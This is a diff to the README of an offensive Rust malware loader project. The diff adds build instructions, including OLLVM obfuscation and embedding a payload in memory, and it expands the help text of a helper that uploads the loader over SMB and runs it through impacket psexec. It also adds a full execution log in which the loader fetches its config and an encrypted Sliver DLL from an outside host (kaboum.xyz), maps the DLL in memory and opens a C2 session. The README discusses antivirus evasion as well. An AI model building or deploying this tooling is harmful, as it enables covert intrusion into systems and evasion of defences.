@@ -30,10 +30,11 @@ malléable : adjectif
   - [2. Encrypt payload (optionnal)](#2-encrypt-payload-optionnal)
   - [3. Create config file](#3-Create-config-file)
   - [4. Compile loader](#4-Compile-loader)
-    - [linux compilation](#linux-compilation)
-    - [windows debug compilation with logs](#windows-debug-compilation-with-logs)
-    - [windows release compilation](#windows-release-compilation)
-    - [windows OLLVM release compilation](#windows-OLLVM-release-compilation)
+    - [4.1 linux compilation](#linux-compilation)
+    - [4.2 windows debug compilation with logs](#windows-debug-compilation-with-logs)
+    - [4.3 windows release compilation](#windows-release-compilation)
+    - [4.4 windows OLLVM release compilation](#windows-OLLVM-release-compilation)
+    - [4.5 windows compilation with payload in memory](#45-windows-compilation-with-payload-in-memory)
   - [5. Deploy config and payload](#5-Deploy-config-and-payload)
 - [Side scripts](#Side-scripts)
   - [Winrust](#Winrust)
@@ -258,6 +259,8 @@ lit=$(python -c "import random; print(random.randint($min,$max))")
 export LITCRYPT_ENCRYPT_KEY=$(tr -dc A-Za-z0-9 </dev/urandom | head -c $lit; echo)
 ```
 
+You should also add a winrust alias to use it easily.
+
 ### debug logs
 
 If you want to use the log/debug option, you should set global env variable for system and user in the Windows host:
@@ -292,13 +295,17 @@ cargo run --bin encrypt_payload ~/.malleable/payload/sliver.dll
 Here you will generate a config file, sign it and prepare the file to become the initial config loader.
 
 conf.rs is designed to create Working json config file and sign it automatically.
-By default, the conf.rs script try to fetch key to decrypt dll here: `.malleable/payloads/sliver/sliver.dll.dataop` , modifying it for simplicity: 
+By default, the conf.rs script try to fetch key to decrypt dll here: `.malleable/payload/sliver.dll.dataop` , modifying it for simplicity: 
 
-```cargo run --bin conf dll```
+```
+cargo run --bin conf dll
+```
 
 If you modify a json config by hand, you should sign it againg.
 
-```cargo run --bin sign /home/user/.malleable/config/initial.json```
+```
+cargo run --bin sign /home/user/.malleable/config/initial.json
+```
 
 ## 4. Compile loader
 
@@ -308,42 +315,91 @@ Here you will compile the loader with the initial config file.
 - encrypted+obfsuscated initial config is store in `~/.malleable/config/initial.json.aead` when you sign it/
 - And this file contains decrypt key + all dataoperation to decrypt the initial config : `~/.malleable/config/initial.json.aead.dataop.rot13b64`
 
-Here, find the 
+### 4.1 linux compilation
 
-### linux compilation
+```
+cargo run --bin loader
+```
 
-```cargo run --bin loader```
+### 4.2 windows debug compilation with logs
 
-### windows debug compilation with logs
-
-```cargo rustc --target x86_64-pc-windows-gnu --bin loader --features logdebug```
-
-or with **winrust.py** (recommended)
-
-```winrust loader --debug```
-
-### windows release compilation
-
-```cargo build --target x86_64-pc-windows-gnu --bin loader --release```
+```
+cargo rustc --target x86_64-pc-windows-gnu --bin loader --features logdebug
+```
 
 or with **winrust.py** (recommended)
 
-```winrust loader --release```
+```
+winrust loader --debug
+```
+
+### 4.3 windows release compilation
+
+```
+cargo build --target x86_64-pc-windows-gnu --bin loader --release
+```
+
+or with **winrust.py** (recommended)
+
+```
+winrust loader --release
+```
 
 
-### windows OLLVM release compilation
+### 4.4 windows OLLVM release compilation
 
 
 The OLLVM compilation should be reserved for release build.
 
 This oneliner use approximately 4go of RAM (to confirm):
 
-```sudo docker run -v $(pwd):/projects/ -e LITCRYPT_ENCRYPT_KEY="$LITCRYPT_ENCRYPT_KEY" -it ghcr.io/joaovarelas/obfuscator-llvm-16.0 cargo rustc --bin loader --features ollvm  --target x86_64-pc-windows-gnu --release -- -Cdebuginfo=0 -Cstrip=symbols -Cpanic=abort -Copt-level=3 -Cllvm-args='-enable-acdobf -enable-antihook -enable-adb -enable-bcfobf -enable-cffobf -enable-splitobf -enable-subobf -enable-fco -enable-strcry -enable-constenc'```
+```
+sudo docker run -v $(pwd):/projects/ -e LITCRYPT_ENCRYPT_KEY="$LITCRYPT_ENCRYPT_KEY" -it ghcr.io/joaovarelas/obfuscator-llvm-16.0 cargo rustc --bin loader --features ollvm  --target x86_64-pc-windows-gnu --release -- -Cdebuginfo=0 -Cstrip=symbols -Cpanic=abort -Copt-level=3 -Cllvm-args='-enable-acdobf -enable-antihook -enable-adb -enable-bcfobf -enable-cffobf -enable-splitobf -enable-subobf -enable-fco -enable-strcry -enable-constenc'
+```
 
 Depending of the compilation options you choose, you should monitor your RAM consumption because this increase too much and stop/freeze your computer when reaching the maximum you have.
-
 Because of that, some compilation flag are not includ by default in winrust
 
+You can also do that with winrust:
+
+```
+winrust loader --ollvm
+```
+
+### 4.5 windows compilation with payload in memory
+
+This part show you how to include memory into the loader at compile time.
+You can create a demo config with :
+
+```
+cargo run --bin conf memdll
+```
+
+As you see, the memory number choosen is precise by memory_nb parameter :
+
+```
+  "payloads": [
+    {
+      "DllFromMemory": {
+        "link": {
+          "MEMORY": {
+            "memory_nb": 1,
+            "dataoperation": [
+              {
+                "AEAD": {
+```
+
+Then, you should compile the code with the `--features mem1` compilation option
+
+```
+cargo build --target x86_64-pc-windows-gnu --bin "loader" --features mem1
+```
+
+Or with winrust, you should use the `--mem1` option:
+
+```
+winrust loader --debug --mem1
+```
 
 ## 5. Deploy config and payload
 
@@ -371,26 +427,30 @@ Moreover, this script help you for debugging by adding output, perform OLLVM com
 
 ```
 └─$ winrust --help
-usage: winrust [-h] [--mem1] [--mem2] [--mem3] [--mem4] [-exec_target EXEC_TARGET] [-exec_method EXEC_METHOD] [--ollvm] [--release] [--log] [--verbose] bin
+usage: winrust [-h] [--mem1] [--mem2] [--mem3] [--mem4] [-exec_target EXEC_TARGET] [-exec_method EXEC_METHOD] [--ollvm]
+               [--release] [--log] [--verbose]
+               bin
 
-Tools to help from Linux to compile rust code Windows and then exec it into a Windows host by uploading with SMB + use some some impacket LateralMovement techniques
+Tools to help from Linux to compile rust code Windows and then exec it into a Windows host by uploading with SMB + use some some
+impacket LateralMovement techniques
 
 positional arguments:
   bin                   target bin
 
 options:
   -h, --help            show this help message and exit
-  --mem1                add file to memory 1
-  --mem2                add file to memory 2
-  --mem3                add file to memory 3
-  --mem4                add file to memory 4
+  --mem1                add a file in MEMORY_1 at compilation time, file should be located here: ~/.malleable/config/mem1
+  --mem2                add a file in MEMORY_2 at compilation time, file should be located here: ~/.malleable/config/mem2
+  --mem3                add a file in MEMORY_3 at compilation time, file should be located here: ~/.malleable/config/mem3
+  --mem4                add a file in MEMORY_4 at compilation time, file should be located here: ~/.malleable/config/mem4
   -exec_target EXEC_TARGET
                         [[domain/]username[:password]@]<targetName or address>, by default use the content of ~/.exec
   -exec_method EXEC_METHOD
                         Method to execute on the Windows side, default psexec.py
   --ollvm               OLLVM obfuscation, add the release flag automatically
   --release             activate the cargo release mode for compilation, sinon its debug
-  --log, --debug        activate the agent debug log into STDOUT, you should also activate rust loggin via env variable: setx RUST_LOG info /m + setx RUST_LOG info
+  --log, --debug        activate the agent debug log into STDOUT, you should also activate rust loggin via env variable: setx
+                        RUST_LOG info /m + setx RUST_LOG info
   --verbose, -v         verbose execution
 
 by Brother
@@ -398,6 +458,67 @@ by Brother
 
 -> be carefull, **psexec.py** is catch by Antivirus Defender but have the advantage of sending live output during execution wish is very important to debug.
 if you want to test against an Defender, you can switch to **atexex.py**, you will have output but at the end of the execution.
+
+
+example of winrust usage (you should add the --debug option to have output for debugging) :
+
+```
+┌──(user㉿DRACONYS)-[~/malleable-rust-loader]
+└─$ winrust loader --debug
+2024-11-13 08:10:15,909 INFO	[+] NORMAL Compilation
+2024-11-13 08:10:15,909 INFO	cargo build --target x86_64-pc-windows-gnu --bin "loader"  --features logdebug 
+    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.19s
+2024-11-13 08:10:16,153 INFO	[+] compilation succeed
+2024-11-13 08:10:16,160 INFO	-rwxrwxr-x 2 user user 113M Nov 13 08:07 target/x86_64-pc-windows-gnu/debug/loader.exe
+2024-11-13 08:10:16,170 INFO	target/x86_64-pc-windows-gnu/debug/loader.exe: PE32+ executable (console) x86-64, for MS Windows, 24 sections
+2024-11-13 08:10:16,475 INFO	a662eb2c547ed9b9050ec57f7af4132261d4b855f32bdcbcc4484e8fb2df5ef6  target/x86_64-pc-windows-gnu/debug/loader.exe
+2024-11-13 08:10:16,627 INFO	198652096989789263e405449e428e3c177cfbf9  target/x86_64-pc-windows-gnu/debug/loader.exe
+2024-11-13 08:10:16,683 INFO	[+] upload file via SMB into target
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# # # -rw-rw-rw-  117551412  Wed Nov 13 08:10:19 2024 loader-c00219d5113940bfb537ffb24db777b3.exe
+# 2024-11-13 08:10:19,906 INFO	[+] exec c:\loader-c00219d5113940bfb537ffb24db777b3.exe with psexec.py
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.56.23.....
+[*] Found writable share ADMIN$
+[*] Uploading file vHqTQByx.exe
+[*] Opening SVCManager on 192.168.56.23.....
+[*] Creating service fERt on 192.168.56.23.....
+[*] Starting service fERt.....
+[!] Press help for extra shell commands
+[2024-11-13T07:10:20Z INFO  loader] [+] DECRYPT initial config
+[2024-11-13T07:10:20Z INFO  loader] [+] DECRYPTED!
+[2024-11-13T07:10:20Z INFO  loader] [+] VERIFY initial config
+[2024-11-13T07:10:20Z INFO  loader] [+] VERIFIED!
+    
+[2024-11-13T07:10:20Z INFO  loader] [+] BEGIN LOOP 1 --------------------------------------------------------
+list: ["DEBUG-W10"], operator: OR }), DomainJoin(DomainJoin { list: ["sevenkingdoms.local", "essos.local"], operator: AND })], sign_material: SignMaterial { peer_public_key_bytes: [112, 194, 204, 237, 240, 179, 23, 52, 29, 200, 231, 54, 135, 93, 42, 235, 33, 229, 186, 79, 214, 25, 90, 188, 100, 202, 160, 18, 211, 143, 90, 18], sign_bytes: [202, 177, 192, 91, 55, 252, 77, 88, 46, 133, 18, 112, 170, 14, 35, 198, 103, 242, 155, 109, 176, 215, 83, 56, 87, 4, 215, 134, 54, 174, 116, 205, 232, 139, 143, 233, 229, 119, 59, 185, 107, 179, 101, 244, 157, 41, 96, 189, 204, 209, 225, 34, 137, 61, 183, 109, 144, 156, 195, 35, 204, 167, 88, 12] }, sleep: 1, jitt: 1 }
+[2024-11-13T07:10:20Z INFO  malleable_rust_loader::loaderconf] sleep: 1.4779852741068524
+[2024-11-13T07:10:22Z INFO  loader] [+] DEFUSE RELOAD config
+[2024-11-13T07:10:22Z INFO  malleable_rust_loader::loaderconf] 1/1 defuse: CheckInternet(CheckInternet { list: ["https://www.microsoft.com", "https://google.com", "https://login.microsoftonline.com"], operator: AND })
+[2024-11-13T07:10:22Z INFO  malleable_rust_loader::link] sleep: 1.6500650048148768
+[2024-11-13T07:10:24Z INFO  loader] [+] RELOAD config
+[2024-11-13T07:10:24Z INFO  loader] 1/2 config link: HTTP(HTTPLink { url: "https://kaboum.xyz/artdonjon/gobelin.html", dataoperation: [WEBPAGE, BASE64], sleep: 0, jitt: 0 })
+[2024-11-13T07:10:24Z INFO  malleable_rust_loader::link] sleep: 0
+[2024-11-13T07:10:24Z INFO  loader] verify signature: true
+[2024-11-13T07:10:24Z INFO  loader] same loader: true
+[2024-11-13T07:10:24Z INFO  loader] [+] DECISION: keep the same active LOADER, and run the payloads
+[2024-11-13T07:10:24Z INFO  loader] [+] DEFUSE payload exec
+[2024-11-13T07:10:24Z INFO  malleable_rust_loader::loaderconf] 1/2 defuse: Hostname(Hostname { list: ["DEBUG-W10"], operator: OR })
+[2024-11-13T07:10:24Z INFO  malleable_rust_loader::loaderconf] 2/2 defuse: DomainJoin(DomainJoin { list: ["sevenkingdoms.local", "essos.local"], operator: AND })
+[2024-11-13T07:10:24Z INFO  loader] [+] PAYLOADS exec
+[2024-11-13T07:10:24Z INFO  malleable_rust_loader::loaderconf] 1/1 payload: DllFromMemory(DllFromMemory { link: HTTP(HTTPLink { url: "https://kaboum.xyz/artdonjon/donjon_dll.jpg", dataoperation: [AEAD(AeadMaterial { key_bytes: [100, 7, 159, 177, 160, 143, 247, 73, 181, 159, 214, 81, 14, 49, 140, 153, 172, 173, 53, 223, 224, 148, 237, 97, 223, 41, 6, 110, 8, 112, 20, 233], associated_data: [], nonce: 751301581, tag: [105, 138, 234, 91, 135, 162, 172, 126, 187, 13, 130, 83, 80, 91, 3, 137] })], sleep: 0, jitt: 0 }), dll_entrypoint: "DllInstall" })
+[2024-11-13T07:10:24Z INFO  malleable_rust_loader::link] sleep: 0
+[2024-11-13T07:10:25Z WARN  malleable_rust_loader::payload] Map DLL in memory
+[2024-11-13T07:10:25Z WARN  malleable_rust_loader::payload] Retreive DLL entrypoint: DllInstall
+[2024-11-13T07:10:25Z WARN  malleable_rust_loader::payload] dll_entry_point()
+```
+
+And we got a session in Sliver !
+
+![Sliver session](sliver_session.png?raw=true "Kaboum!")
 
 
 ## Stop Antivirus
@@ -423,6 +544,7 @@ sudo upx -9 -v --ultra-brute  target/x86_64-pc-windows-gnu/release/loader.exe
 - more payload
 - more Link to fetch data : DNS + WebSocket
 - More way to defeat static analysis -> tricks are welcome!
+- The --bin check just to verify configuration file before sign
 - Network redirector to modify the traffic behavior of an implant (listen 127.0.0.1 -> redirect to C2)
 - collect data and send to C2 with a special payload : TODO
 - find a way to sends logs into a C2, could be nice for error
